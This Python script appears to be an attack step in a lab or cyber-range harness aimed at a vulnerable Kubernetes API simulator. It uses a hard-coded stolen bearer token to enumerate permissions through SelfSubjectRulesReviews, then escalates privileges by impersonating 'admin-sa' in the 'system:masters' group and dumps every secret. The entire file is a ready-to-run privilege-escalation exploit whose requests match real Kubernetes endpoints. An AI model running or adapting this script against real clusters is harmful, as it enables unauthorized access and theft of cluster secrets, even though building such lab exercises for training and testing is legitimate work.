import time
import requests
import json

def _wait_for_simulator(url: str, timeout: int = 300) -> None:
    print("[*] Waiting for simulator to become ready...")
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            requests.get(f"{url}/health", timeout=3)
            print("[+] Simulator is ready.")
            return
        except Exception:
            time.sleep(10)
    raise RuntimeError(f"Simulator at {url} did not become ready within {timeout}s")

def run(outputs: dict, region: str = "us-east-1") -> None:
    ip = outputs.get("vuln_instance_ip")
    if not ip:
        raise RuntimeError("Missing vuln_instance_ip stack output.")

    url = f"http://{ip}:8080"
    _wait_for_simulator(url)

    headers = {"Authorization": "Bearer stolen-dev-token"}

    print("[*] Phase 1: Self Subject Rules Review (Permission Enumeration)")
    try:
        resp = requests.post(f"{url}/apis/authorization.k8s.io/v1/selfsubjectrulesreviews", headers=headers, timeout=10)
        if resp.status_code == 200:
            print("[+] Successfully queried SelfSubjectRulesReviews!")
            print(f"[+] Permissions returned: {resp.json().get('status', {}).get('resourceRules')}")
        else:
            print(f"[-] SSRR failed with status code {resp.status_code}")
    except Exception as e:
        print(f"[-] Connection failed: {e}")
        return

    print("[*] Phase 2: Attempting Privilege Escalation via Impersonation")
    imp_headers = {
        **headers,
        "Impersonate-User": "admin-sa",
        "Impersonate-Group": "system:masters"
    }

    try:
        resp = requests.get(f"{url}/api/v1/secrets", headers=imp_headers, timeout=10)
        if resp.status_code == 200:
            print("[+] Privilege Escalation Successful!")
            print(f"[+] Retrieved Secret: {resp.json()}")
        else:
            print(f"[-] Impersonation failed with status code {resp.status_code}")
    except Exception as e:
        print(f"[-] Impersonation request failed: {e}")
